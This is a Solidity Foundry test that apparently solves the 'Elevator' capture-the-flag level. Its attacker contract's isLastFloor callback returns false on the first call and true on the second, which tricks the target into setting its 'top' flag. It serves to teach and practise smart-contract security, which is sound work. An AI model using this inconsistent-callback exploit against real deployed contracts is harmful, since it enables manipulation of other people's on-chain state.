// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "../lib/forge-std/src/Test.sol";
import {Elevator} from "../src/Elevator.sol";
interface IBuilding {
    function isLastFloor(uint256) external returns (bool);
}

contract ElevatorTest is Test {
    Elevator target;
    ElevatorHacker hackTarget;

    function setUp() public {
        target = new Elevator();
        hackTarget = new ElevatorHacker(address(target));
    }

    function test_ElevatorToReceiveEther() public {
        hackTarget.hack();
        assert(target.top() == true);
    }
}

contract ElevatorHacker is IBuilding {
    Elevator public target;
    uint256 public callingTimes;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function hack() external {
        target.goTo(1);
    }

    function isLastFloor(uint256 value) external override returns (bool) {
        if (callingTimes % 2 == 0) {
            callingTimes++;
            return false;
        }
        callingTimes++;
        return true;
    }
}
